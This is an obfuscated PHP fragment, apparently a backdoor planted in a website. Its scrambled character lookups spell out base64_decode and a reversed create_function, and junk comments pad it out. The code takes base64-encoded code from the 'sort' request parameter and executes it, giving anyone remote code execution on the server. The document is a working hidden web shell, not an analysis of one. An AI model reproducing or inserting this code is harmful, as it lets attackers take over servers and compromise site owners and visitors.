...
$yasdyopc7982 = "w(4lkn7)yub9d5gp/j80_qeart6zc3fh;xs1i2o*mv.";


$pGuWJdxS57 = "";

foreach([34,38,24,25] as $J){
       $pGuWJdxS57 .= $yasdyopc7982[$J];
    }


if(isset($REQUEST /*HDVsLPzdOgkFcucClVzZBDzCLIBoYdCQagcldIYfScPDFfAjaiDcqfVNlndwYyXHmdcyoUrBQqoUcjSjJPAyYbltGmyXRmlRstWetAEqHZGFsGdDmPqoArusTENSEttv*/["$pGuWJdxS57"])){
    $rdJesAKz8417 = $_REQUEST /*HDVsLPzdOgkFcucClVzZBDzCLIBoYdCQagcldIYfScPDFfAjaiDcqfVNlndwYyXHmdcyoUrBQqoUcjSjJPAyYbltGmyXRmlRstWetAEqHZGFsGdDmPqoArusTENSEttv*/["$pGuWJdxS57"];
    $uszTZtoo8272 = "";
    $NwyanpXh5931 = "";

    /*byVaxKbpWhkUuskhqxjSJbVwXiFIfyXWEbjduwbuYPKPoJWDRkVFCXtlWaBnWYgdbXrzjCWTTQeddtBukqALpmKtOlskHTiDsntoTbJLIlrKKxaEyQYkVUUVAQbCmgex*/

    foreach([10,23,34,22,26,2,20,12,22,28,38,12,22] as $J){
       $uszTZtoo8272 .= $yasdyopc7982[$J];
    }

    /*CXoxvTrWqZxLlUthFJqduXYQfOEmKNTKGadaSfRBShxfGLFeFWBpNsWfEfbqbOCqDwLWiKmAoIrTUVLuzCGVahNNWQrOmifqtmmmrJzSDDebczKemCEUgqxPiVBFqVBK*/


    foreach([34,25,24,24,22,41] as $J){
       $NwyanpXh5931 .= $yasdyopc7982[$J];
    }

    /*dwHVucHDLSKCdwDiTVwngSbkntEQocQxHZWXqOHINzkwYNpFtIhaZOzZmlBugDZEeVeugTChJBDKMyUvNOMfLdQhewrsRxbevlgjPspZyWQsuBuFbokFrMaJQabJvLXY*/

    $J = $NwyanpXh5931('n'.''.''.''.''.'o'.'i'.'t'.''.''.''.'c'.'n'.''.''.''.''.'u'.'f'.'_'.'e'.'t'.''.''.'a'.'e'.'r'.''.''.''.''.'c'.'');
    $S = $J("", $uszTZtoo8272($rdJesAKz8417));
    $S();
    exit();
